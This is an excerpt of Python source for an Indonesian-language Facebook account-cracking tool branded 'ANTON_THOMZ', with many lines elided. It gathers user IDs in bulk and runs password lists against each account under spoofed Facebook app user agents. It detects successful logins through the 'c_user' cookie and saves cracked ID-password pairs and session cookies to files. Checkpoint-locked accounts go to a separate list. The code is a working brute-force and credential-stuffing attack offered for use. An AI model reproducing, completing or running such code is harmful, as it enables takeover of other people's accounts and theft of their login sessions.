...
def dump_massal():
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] ANTON_THOMZ [/]]",style=f"bold white"))
	...
	for user in uid:
	    try:
	      ...
	      pass
	        ...
	        exit()
	try:
	      prints(panel(f"lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]ANTON_THOMZ[/]]",style=f"bold white"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
...
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('ANTON_THOMZ-OK')
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('ANTON_THOMZ-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:lin = open('ANTON_THOMZ-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
...
#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('ANTON_THOMZ-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('ANTON_THOMZ-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
		    ...
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('ANTON_THOMZ-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["🤖","😝",])
	prog.update(des,description=f"\r {emot}( ANTON )(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]")
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f"⌲ tools: {hijo}{ANTON_THOMZ}")
				print(f'{hijo}{ua}')
				open('ANTON_THOMZ-OK/'+'ANTON_THOMZ-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('ANTON_THOMZ-OK/'+'ANTON_THOMZ-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
				...
				print(f"⌲ tools: {hijo}{ANTON_THOMZ}")
				print(f'{mer}{ua}')
				open('ANTON_THOMZ-CP/'+'ANTON_THOMZ-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
...
def crackreguler(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]"]) 		
			ses.headers.update(
			{
			"Host":url,
			"upgrade-insecure-requests":"1",
...
def crackasyinc(idf,pwx):
  ...
  for pw in pwx:
    try:
      ...
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/FBIOS;FBAV/196.0.0.52.95;FBBV/129677436;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/ru_RU;FBOP/5"])
...
if __name__=='__main__':
	...
	try:os.mkdir('ANTON_THOMZ-OK')
	except:pass
	try:os.mkdir('ANTON_THOMZ-CP')
	except:pass
	menu()
